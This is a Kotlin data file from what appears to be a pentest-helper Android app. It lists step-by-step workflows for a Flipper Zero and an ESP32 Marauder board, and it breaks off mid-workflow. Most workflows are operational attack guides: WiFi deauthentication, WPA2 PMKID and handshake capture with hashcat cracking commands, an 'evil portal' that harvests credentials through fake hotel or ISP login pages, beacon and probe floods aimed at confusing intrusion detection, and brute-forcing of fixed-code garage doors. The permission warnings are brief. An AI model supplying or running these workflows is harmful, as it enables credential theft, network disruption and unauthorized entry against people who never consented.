package com.twoskoops707.newpen.data

import com.twoskoops707.newpen.data.models.Category
import com.twoskoops707.newpen.data.models.Command
import com.twoskoops707.newpen.data.models.Device
import com.twoskoops707.newpen.data.models.Hardware
import com.twoskoops707.newpen.data.models.Workflow
import com.twoskoops707.newpen.data.models.WorkflowStep

object WorkflowRepository {

    private val allWorkflows: List<Workflow> = listOf(

        // ── SETUP ─────────────────────────────────────────────────────────────

        Workflow(
            id = "setup_momentum",
            title = "Install Momentum Firmware",
            subtitle = "Upgrade Flipper Zero with the best custom firmware",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is Momentum?",
                    description = "Momentum is a free custom firmware upgrade for your Flipper Zero. It unlocks BLE Spam, more Sub-GHz frequencies, extra apps, and a better interface — without voiding anything. It's reversible.",
                    tips = listOf("Most popular custom firmware right now", "Updates safely through the official Flipper app")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open the Flipper Mobile App",
                    description = "On your phone, open the Flipper Mobile App (download free from Google Play if needed). Make sure Bluetooth is ON on your phone. Your Flipper should be powered on.",
                    tips = listOf("App name: 'Flipper Mobile App' by Flipper Devices Inc")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Enable Bluetooth on Flipper",
                    description = "On your Flipper: press the center button → scroll to Settings → press OK → scroll to Bluetooth → press OK → set to ON.",
                    commands = listOf(Command("Navigate to", "Settings → Bluetooth → ON", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Pair Flipper to Phone",
                    description = "In the Flipper app, tap the '+' in the top right. Your Flipper appears in the list — tap its name. A number appears on both screens — confirm they match, then tap Pair.",
                    tips = listOf("Pair code times out in 30 seconds — act fast")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Switch to Momentum Channel",
                    description = "In the Flipper app, tap your connected Flipper's name → tap the firmware version → tap Release Channel → select Momentum → tap Update. The download and install runs automatically.",
                    warning = "Do NOT close the app or disconnect until the update finishes (~5 min)",
                    tips = listOf("Screen will flicker during install — that's normal")
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Confirm Success",
                    description = "When Flipper reboots you'll see 'Momentum' on the startup screen. You now have BLE Spam, Sub-GHz region unlock, Control Center swipe-down, and more apps.",
                    tips = listOf("New unlocked: BLE Spam app, extra frequencies, Tetris, extra Sub-GHz protocols")
                )
            )
        ),

        Workflow(
            id = "setup_unleashed",
            title = "Install Unleashed Firmware",
            subtitle = "Alternative custom firmware focused on Sub-GHz and RF unlocks",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Momentum vs Unleashed",
                    description = "Unleashed focuses on maximum RF unlocks — all Sub-GHz frequencies, region bypasses, and raw protocol support. Momentum has more apps and a nicer UI. Pick Unleashed if RF is your priority.",
                    tips = listOf("You can switch between firmwares anytime — nothing is permanent")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open Flipper App and Navigate to Updates",
                    description = "Open the Flipper Mobile App on your phone → connect to your Flipper → tap the firmware version area → tap Release Channel.",
                    commands = listOf(Command("Navigate", "Flipper App → Device → Firmware → Release Channel", Device.ANDROID))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Select Unleashed",
                    description = "In the Release Channel list, select 'Unleashed'. Tap Update. The firmware downloads and installs automatically. Wait for the reboot.",
                    warning = "Keep phone screen on and app open during install"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Verify and Explore",
                    description = "After reboot you'll see the Unleashed boot logo. Go to Sub-GHz app — you'll now have access to all frequencies including 315MHz, 390MHz, 433MHz, 868MHz, and more without region locks.",
                    tips = listOf("Unleashed also adds more BadUSB payloads and extra RFID support")
                )
            )
        ),

        Workflow(
            id = "setup_marauder",
            title = "Flash AWOK with Marauder",
            subtitle = "Install Marauder WiFi attack firmware on AWOK Dual Mini v3",
            categoryId = "setup",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3", "PC with internet", "USB-C cable"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Check If Already Flashed",
                    description = "Plug your AWOK into power. If the screen shows a Marauder menu with options like WiFi, BLE, Bluetooth — you're already done. Skip this workflow.",
                    tips = listOf("Most AWOK units ship with Marauder pre-installed")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Get the Easy Flash Tool",
                    description = "On your PC, go to: github.com/Fr4nkFletcher/ESP32-Marauder-Cheap-Yellow-Display/releases — Download the latest FZEasyMarauderFlash.zip. Extract it.",
                    tips = listOf("This tool auto-picks the right firmware for your exact board")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Enter Flash Mode",
                    description = "Hold the BOOT button on the AWOK (small button on the side or back). While holding BOOT, plug the USB-C cable into your PC. Then release BOOT. Board is now in flash mode.",
                    warning = "Must hold BOOT BEFORE plugging in — not after"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Run the Flash Script",
                    description = "In the extracted folder, double-click flash.bat (Windows) or run flash.sh (Mac/Linux). The tool finds your board, downloads Marauder, and installs it. Green scrolling text = working.",
                    tips = listOf("Takes 2-3 minutes", "If it says 'port not found' — try a different USB port")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Reboot and Confirm",
                    description = "Unplug and replug your AWOK. You'll see the Marauder boot screen and menus. Use the on-screen buttons to navigate. Success.",
                    tips = listOf("Main menu items: WiFi, BLE, Bluetooth, Packets, Settings")
                )
            )
        ),

        Workflow(
            id = "setup_connect_awok_flipper",
            title = "Connect AWOK to Flipper Zero",
            subtitle = "Control AWOK through Flipper's WiFi Marauder app",
            categoryId = "setup",
            hardware = listOf(Hardware.BOTH),
            prerequisites = listOf("Flipper Zero with Momentum/Unleashed", "AWOK Dual Mini v3 with Marauder", "UART/GPIO cable or stacking connector"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Connection Methods",
                    description = "Two options:\n• STACK: AWOK plugs directly onto Flipper's GPIO header (if it has a stacking connector) — one compact unit\n• CABLE: Run a 4-wire UART cable between AWOK's TX/RX/GND/3.3V pins and Flipper's GPIO header pins\n\nEither way, Flipper talks to AWOK over UART serial.",
                    tips = listOf("Stacking is cleaner — the AWOK Dual Mini v3 is designed for this")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "UART Pin Wiring (Cable Method)",
                    description = "AWOK → Flipper GPIO header:\n• AWOK TX → Flipper pin 14 (RX)\n• AWOK RX → Flipper pin 13 (TX)\n• AWOK GND → Flipper pin 8 or 11 (GND)\n• AWOK 3.3V → Flipper pin 9 (3.3V)\n\nDo NOT connect 5V — you'll damage the board.",
                    warning = "Use 3.3V only — AWOK ESP32 is NOT 5V tolerant",
                    commands = listOf(Command("Pin map", "AWOK TX→F:14 | RX→F:13 | GND→F:8 | 3V3→F:9", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Install WiFi Marauder App on Flipper",
                    description = "On Flipper: press center button → Apps → GPIO → scroll to [ESP32] WiFi Marauder → press OK.",
                    commands = listOf(Command("Navigate to", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)),
                    tips = listOf("If not installed: Flipper Mobile App → Apps → search 'WiFi Marauder' → Install")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Set Baud Rate",
                    description = "First time in the app, select Setup → set baud rate to 115200. This must match what Marauder uses on the AWOK side (default is 115200).",
                    commands = listOf(Command("Baud rate", "115200", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Test Connection",
                    description = "In the Flipper WiFi Marauder app terminal, select 'help' from the command list. You should see a list of Marauder commands scroll past. If you see them — it's working.",
                    commands = listOf(Command("Test", "help", Device.MARAUDER)),
                    tips = listOf("No response? Check wiring, check baud rate is 115200 on both ends")
                )
            )
        ),

        Workflow(
            id = "setup_pair_bt",
            title = "Pair Flipper to Android Phone",
            subtitle = "Link phone and Flipper Zero via Bluetooth for remote control",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Enable Flipper Bluetooth",
                    description = "Press center button on Flipper → scroll to Settings → OK → scroll to Bluetooth → OK → set to ON.",
                    commands = listOf(Command("Navigate to", "Settings → Bluetooth → ON", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open Flipper App",
                    description = "Open the Flipper Mobile App on your Android phone. Make sure your phone's Bluetooth is also ON.",
                    tips = listOf("Free from Google Play: search 'Flipper Mobile App'")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Pair Them",
                    description = "In the app, tap '+' top right → your Flipper's name appears → tap it → matching numbers appear on both screens → tap Pair on phone.",
                    tips = listOf("Code expires in ~30 seconds", "If pairing fails: toggle Flipper BT off and back on")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Use Remote Features",
                    description = "Once paired, the Flipper app lets you: browse and manage files, install apps, stream what's on the Flipper screen, and use it as a remote control from your phone.",
                    tips = listOf("Pairing is remembered — auto-connects next time")
                )
            )
        ),

        // ── WIFI (AWOK / Marauder) ─────────────────────────────────────────────

        Workflow(
            id = "wifi_scan",
            title = "Scan All WiFi Networks",
            subtitle = "Map every access point and connected device nearby",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open WiFi Menu",
                    description = "On your AWOK screen, use the buttons to navigate to the WiFi menu. Select 'Scan APs'. The board will scan all 2.4GHz channels and list every access point it finds.",
                    commands = listOf(Command("Navigate to", "WiFi → Scan APs", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "View Results",
                    description = "After a few seconds, a list appears showing: network name (SSID), signal strength (RSSI), channel, encryption type (WPA2/WPA3/Open), and MAC address (BSSID).",
                    tips = listOf("Higher RSSI number = stronger signal", "Open networks have no lock icon")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Scan for Clients",
                    description = "Next, select 'Scan STAs' (stations). This shows all WiFi client devices (phones, laptops) actively looking for or connected to networks.",
                    commands = listOf(Command("Navigate to", "WiFi → Scan STAs", Device.MARAUDER)),
                    tips = listOf("Clients show their probe requests — networks they're trying to auto-join")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop Scanning",
                    description = "When done, navigate to Stop Scan or press the back/stop button. Results stay on screen.",
                    commands = listOf(Command("Stop", "WiFi → Stop Scan", Device.MARAUDER))
                )
            )
        ),

        Workflow(
            id = "wifi_deauth",
            title = "Deauth WiFi Clients",
            subtitle = "Kick devices off a WiFi network using deauthentication frames",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Target network visible in scan"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan First",
                    description = "Run a WiFi AP scan first so you have a target to select. Navigate: WiFi → Scan APs → wait for results.",
                    commands = listOf(Command("Step 1", "WiFi → Scan APs", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Target Network",
                    description = "After the scan, navigate to List APs. Scroll through the list and select the target network by pressing OK/select on it. It will be highlighted.",
                    commands = listOf(Command("Select", "WiFi → List APs → [select target]", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Launch Deauth",
                    description = "Navigate to Attack → Deauth. The AWOK will repeatedly send 802.11 deauthentication frames to the target AP and its clients, forcing them offline.",
                    commands = listOf(Command("Attack", "Attack → Deauth", Device.MARAUDER)),
                    warning = "Disrupts all devices on that network. Use only on networks you own or have permission to test.",
                    tips = listOf("WPA3 networks with Protected Management Frames (PMF) are resistant to deauth")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop Attack",
                    description = "Press stop or navigate back to end the deauth. Clients will reconnect normally once you stop.",
                    commands = listOf(Command("Stop", "Attack → Stop Attack", Device.MARAUDER))
                )
            )
        ),

        Workflow(
            id = "wifi_pmkid",
            title = "Capture PMKID Hash",
            subtitle = "Grab WPA2 handshake material without waiting for a client",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card in AWOK"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is a PMKID?",
                    description = "PMKID is a value in WPA2 that can be grabbed directly from an access point without waiting for a client to connect. Once captured, it can be cracked offline to reveal the WiFi password.",
                    tips = listOf("Requires a WPA2 network — doesn't work on WPA3 or Open networks", "Cracking is done on a PC later — the AWOK just captures")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Insert MicroSD",
                    description = "Insert a MicroSD card into the AWOK's slot. Captures are saved as .pcap files that you transfer to a PC for cracking.",
                    tips = listOf("Any size SD card works — capture files are small (a few KB)")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Select Target AP",
                    description = "Scan for APs first (WiFi → Scan APs). Then List APs, select your target network.",
                    commands = listOf(Command("Navigate", "WiFi → Scan APs → List APs → [select]", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Start PMKID Capture",
                    description = "Navigate to Sniff → Sniff PMKID. The AWOK probes the AP and waits for the PMKID response. When captured, you'll see confirmation on screen and the file saves to SD.",
                    commands = listOf(Command("Capture", "Sniff → Sniff PMKID", Device.MARAUDER)),
                    tips = listOf("Takes 5-30 seconds per AP", "Some APs won't respond — move on to the next")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Transfer and Crack",
                    description = "Remove the SD card. On a PC, use hcxtools to convert the .pcap to hashcat format:\nhcxpcapngtool -o hash.hc22000 capture.pcap\nThen crack with hashcat:\nhashcat -m 22000 hash.hc22000 wordlist.txt",
                    commands = listOf(
                        Command("Convert", "hcxpcapngtool -o hash.hc22000 capture.pcap", Device.PC),
                        Command("Crack", "hashcat -m 22000 hash.hc22000 wordlist.txt", Device.PC)
                    ),
                    tips = listOf("rockyou.txt is a common wordlist", "GPU cracking is much faster than CPU")
                )
            )
        ),

        Workflow(
            id = "wifi_handshake",
            title = "Capture WPA2 Handshake",
            subtitle = "Capture 4-way handshake by forcing a client to reconnect",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card", "At least one client connected to target AP"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is a Handshake?",
                    description = "When a device connects to WPA2 WiFi, it exchanges a 4-way handshake with the router. Capturing this lets you crack the password offline. You need at least one device already connected to the target network.",
                    tips = listOf("Combine with deauth — kick a client off, capture when it reconnects")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Sniff Handshakes",
                    description = "Navigate to Sniff → Sniff Handshakes. AWOK listens on the target AP's channel for handshake traffic. Leave it running.",
                    commands = listOf(Command("Start", "Sniff → Sniff Handshakes", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Force a Reconnect",
                    description = "While sniffing, run a quick deauth burst on the target AP. Connected clients will drop and immediately reconnect — triggering a new handshake capture.",
                    commands = listOf(Command("Deauth burst", "Attack → Deauth → [stop after 5 sec]", Device.MARAUDER)),
                    tips = listOf("Short burst is enough — just long enough to kick clients off")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Confirm Capture and Stop",
                    description = "When AWOK shows 'EAPOL' or 'Handshake captured' on screen, stop sniffing. The .pcap is saved to SD.",
                    commands = listOf(Command("Stop", "Sniff → Stop Sniff", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Crack on PC",
                    description = "Convert and crack:\nhcxpcapngtool -o hash.hc22000 handshake.pcap\nhashcat -m 22000 hash.hc22000 wordlist.txt",
                    commands = listOf(
                        Command("Convert", "hcxpcapngtool -o hash.hc22000 handshake.pcap", Device.PC),
                        Command("Crack", "hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule", Device.PC)
                    ),
                    tips = listOf("Add rules (-r best64.rule) to crack more complex passwords", "Try multiple wordlists")
                )
            )
        ),

        Workflow(
            id = "wifi_evilportal",
            title = "Evil Portal (Captive Portal Attack)",
            subtitle = "Spin up a fake WiFi login page to capture credentials",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card with portal HTML file"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is an Evil Portal?",
                    description = "The AWOK creates a fake access point with your chosen name. When someone connects, their device shows a login page (captive portal) that looks like a real WiFi login or site. Whatever they enter gets logged.",
                    tips = listOf("Common targets: fake hotel WiFi, fake coffee shop login, fake ISP page")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Prepare the Portal Page",
                    description = "Create or download an index.html file for your fake portal. Common templates: hotel WiFi login, Starbucks WiFi, AT&T/Spectrum login. Save it to the root of your MicroSD card as 'index.html'.",
                    tips = listOf("Search GitHub for 'evil portal templates' for premade login pages", "Can capture: email, password, phone number — whatever your form asks for")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Launch Evil Portal",
                    description = "On AWOK, navigate to Evil Portal → Start. Select your portal HTML file from SD. Choose an AP name (SSID) that sounds legitimate. The fake network is now broadcasting.",
                    commands = listOf(Command("Launch", "Evil Portal → Start → [select index.html]", Device.MARAUDER)),
                    warning = "Use for authorized security testing only"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Collect Credentials",
                    description = "When a victim connects and submits the form, credentials are logged to SD card. Navigate to Evil Portal → View Log to see captures in real time.",
                    commands = listOf(Command("View log", "Evil Portal → View Log", Device.MARAUDER)),
                    tips = listOf("Combine with deauth on nearby APs to force devices toward your fake AP")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Stop and Review",
                    description = "Stop the portal: Evil Portal → Stop. Check the log file on SD card — credentials are saved as plain text.",
                    commands = listOf(Command("Stop", "Evil Portal → Stop", Device.MARAUDER))
                )
            )
        ),

        Workflow(
            id = "wifi_beacon_spam",
            title = "Beacon Flood / SSID Spam",
            subtitle = "Flood the area with hundreds of fake network names",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What It Does",
                    description = "Beacon flood broadcasts hundreds of fake WiFi network names (SSIDs) per second. Anyone scanning for WiFi nearby will see a wall of garbage networks — makes it nearly impossible to find real ones. Clutters WiFi scanners.",
                    tips = listOf("Fun names list: load a custom SSID list from SD card", "Rick Roll, FBI Surveillance Van, etc.")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Launch Beacon Flood",
                    description = "Navigate to Attack → Beacon → select Rickroll, Random, or load a custom list from SD → Start.",
                    commands = listOf(Command("Launch", "Attack → Beacon → [mode] → Start", Device.MARAUDER)),
                    tips = listOf("Rickroll mode: known funny SSID list built in", "Random: generates random names", "Custom: load your own names.txt from SD")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Custom SSID List",
                    description = "Create a file called 'ssids.txt' on your MicroSD, one SSID per line. Load it from the Beacon menu. Max 32 characters per SSID.",
                    tips = listOf("Include: 'ATT_WiFi_Free', 'xfinitywifi', 'Google Starbucks' for convincing fake hotspots")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop",
                    description = "Press stop or navigate back. The fake networks disappear immediately from other devices' WiFi lists.",
                    commands = listOf(Command("Stop", "Attack → Stop Attack", Device.MARAUDER))
                )
            )
        ),

        Workflow(
            id = "wifi_wardrive",
            title = "Wardrive — Log All Networks",
            subtitle = "Map every WiFi AP in an area with GPS coordinates",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is Wardriving?",
                    description = "Wardriving means scanning for WiFi networks while moving — driving, walking, biking. The AWOK logs every AP it finds (SSID, BSSID, channel, signal, encryption) to SD card for later analysis.",
                    tips = listOf("Classic hacker activity — legal to scan/log in most places", "Results can be imported into Wigle.net or Google Maps")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Wardrive Mode",
                    description = "Insert SD card. Navigate to WiFi → Wardrive → Start. The AWOK continuously scans all channels and logs everything to a CSV file on SD.",
                    commands = listOf(Command("Start", "WiFi → Wardrive → Start", Device.MARAUDER)),
                    tips = listOf("File saved as wardriving.csv on SD root")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Move Around",
                    description = "Walk or drive the area you want to map. The more area you cover, the more networks get logged. AWOK scans all 14 channels rapidly.",
                    tips = listOf("Speed doesn't matter much — AWOK catches networks even at walking speed")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop and Export",
                    description = "Navigate to WiFi → Wardrive → Stop. Pull the SD card. The CSV contains: SSID, BSSID, RSSI, channel, encryption, timestamp. Import into Wigle.net to see your results on a map.",
                    commands = listOf(Command("Stop", "WiFi → Wardrive → Stop", Device.MARAUDER)),
                    tips = listOf("Wigle.net accepts the Marauder CSV format directly")
                )
            )
        ),

        Workflow(
            id = "wifi_probe_flood",
            title = "Probe Request Flood",
            subtitle = "Blast probe requests to confuse nearby devices and APs",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Are Probe Requests?",
                    description = "Probes are WiFi frames that devices send out asking 'is this network here?' Flooding probes with random SSIDs from random spoofed MACs confuses IDS systems and creates noise in the RF environment.",
                    tips = listOf("Can overwhelm basic intrusion detection systems (IDS)")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Launch Probe Flood",
                    description = "Navigate to Attack → Probe → Start. The AWOK blasts probe frames continuously with randomized source MACs and SSIDs.",
                    commands = listOf(Command("Launch", "Attack → Probe → Start", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Stop",
                    description = "Navigate back or select Stop to end the flood.",
                    commands = listOf(Command("Stop", "Attack → Stop", Device.MARAUDER))
                )
            )
        ),

        Workflow(
            id = "wifi_wps_scan",
            title = "WPS Scan",
            subtitle = "Find access points with WPS enabled (vulnerable to Pixie Dust)",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is WPS?",
                    description = "WPS (WiFi Protected Setup) is an older feature on routers that lets you connect by pressing a button or entering an 8-digit PIN. Many routers still have it enabled and it's vulnerable to the Pixie Dust attack which can crack the PIN in seconds.",
                    tips = listOf("Pixie Dust works on a large number of router brands made before 2016")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Scan for WPS Networks",
                    description = "Navigate to Sniff → Sniff WPS. The AWOK logs all beacons advertising WPS support to SD card.",
                    commands = listOf(Command("Scan", "Sniff → Sniff WPS", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Identify Targets",
                    description = "Check the SD log for APs with WPS enabled. Note their BSSIDs. These are candidates for Pixie Dust or PIN brute-force attacks (done on PC with tools like Reaver or Bully).",
                    tips = listOf("Pixie Dust attack can recover the PIN in under 1 minute on vulnerable routers")
                )
            )
        ),

        // ── SUB-GHz ────────────────────────────────────────────────────────────

        Workflow(
            id = "subghz_read_replay",
            title = "Read and Replay a Remote Signal",
            subtitle = "Capture any Sub-GHz remote and replay it",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Sub-GHz App",
                    description = "Press center button on Flipper → scroll to Sub-GHz → press OK.",
                    commands = listOf(Command("Navigate", "Sub-GHz", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Signal",
                    description = "Select Read. Point the remote at your Flipper (within 5-10 cm). Press the button on the remote. Flipper captures and decodes the signal automatically.",
                    tips = listOf("Supports: ASK/OOK, 2FSK, 4FSK on 300-928MHz", "If it says 'Unknown — Save Raw' the protocol isn't recognized but can still be replayed raw")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save It",
                    description = "After capture, press OK → Save → give it a name → Save. It's now in your Sub-GHz saved signals.",
                    commands = listOf(Command("Save path", "Sub-GHz → Saved → [your file]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Replay the Signal",
                    description = "Go to Sub-GHz → Saved → select your saved signal → press OK → Send. Flipper transmits the exact signal. Works for gates, barriers, doorbells, ceiling fans, RF outlets, etc.",
                    tips = listOf("Rolling code remotes (car keyfobs, modern garage doors) change code after each press — replay won't work on those")
                )
            )
        ),

        Workflow(
            id = "subghz_brute_garage",
            title = "Brute-Force Garage Door",
            subtitle = "Cycle through all possible codes for fixed-code garage openers",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum or Unleashed"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Fixed Code vs Rolling Code",
                    description = "Older garage door openers (pre-1995) use a fixed DIP switch code — the same signal every time. These can be brute-forced. Newer ones use rolling codes (Security+, KeeLoq) — brute-force won't work on those.",
                    tips = listOf("Fixed code brands: older Chamberlain, Wayne Dalton, Genie pre-1998, Stanley", "If unsure — try it. Fixed code doors open quickly (under 60 sec)")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open Sub-GHz Brute Force",
                    description = "On Flipper: Sub-GHz → Brute Force → select the protocol (try CAME 12bit or NICE FLO first — most common for older gates/garages).",
                    commands = listOf(Command("Navigate", "Sub-GHz → Brute Force → [protocol]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Select Frequency",
                    description = "Most garage doors use 315MHz (USA) or 433.92MHz (Europe/import). Select the matching frequency. If unsure, try 315MHz first.",
                    tips = listOf("You can check the frequency with Sub-GHz → Frequency Analyzer while pressing the real remote")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Start the Brute Force",
                    description = "Point Flipper at the garage door receiver and press OK to start. Flipper cycles through all possible codes (up to 4096 for 12-bit) automatically. Watch the door.",
                    tips = listOf("Hold Flipper within 1-2 meters of the receiver for best range", "Older fixed-code doors usually open within 30-60 seconds")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Save the Working Code",
                    description = "When the door opens, Flipper shows which code worked. Save it so you never need to brute-force again.",
                    tips = listOf("De Bruijn sequence means Flipper only needs to send each code once — very efficient")
                )
            )
        ),

        Workflow(
            id = "subghz_car_keyfob",
            title = "Car Keyfob Signal Capture",
            subtitle = "Read and analyze vehicle remote signals",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum or Unleashed"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Rolling Code Warning",
                    description = "Modern cars (post-2000 generally) use rolling codes — the signal changes every press. Flipper can capture and save the signal, but replaying it will NOT unlock the car because the code has already been used.",
                    tips = listOf("Older vehicles (pre-1995) with fixed-code fobs CAN be replayed", "This workflow is useful for analysis and understanding — not cloning modern cars")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Capture the Signal",
                    description = "Go to Sub-GHz → Read. Hold your car keyfob close to Flipper and press Lock or Unlock. Flipper captures it.",
                    commands = listOf(Command("Navigate", "Sub-GHz → Read", Device.FLIPPER_CLI)),
                    tips = listOf("Most US cars: 315MHz. Most EU/Asian cars: 433.92MHz. Some: 868MHz")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Check the Protocol",
                    description = "Flipper will try to decode it. Common protocols: KeeLoq (rolling, common in US/Chrysler/GM), Princeton (fixed, older Asian cars), Nice FLO (European gates). Rolling = shows counter value.",
                    tips = listOf("If Flipper says 'KeeLoq' — it's rolling code, you cannot replay it to unlock")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save Raw for Analysis",
                    description = "Even if rolling, save the raw capture. Raw .sub files can be analyzed in Flipper Lab or Universal RF Remote tools. Also useful for understanding signal timing.",
                    commands = listOf(Command("Save raw", "Sub-GHz → Read RAW → [press fob] → Save", Device.FLIPPER_CLI))
                )
            )
        ),

        Workflow(
            id = "subghz_frequency_analyzer",
            title = "Frequency Analyzer",
            subtitle = "Identify what frequency an unknown remote is using",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Frequency Analyzer",
                    description = "Go to Sub-GHz → Frequency Analyzer. The screen shows a live bar graph of RF energy across 300-928MHz.",
                    commands = listOf(Command("Navigate", "Sub-GHz → Frequency Analyzer", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Press Your Remote",
                    description = "Hold the unknown remote close to Flipper and press a button. The frequency bar will spike — that's your frequency. Note the number.",
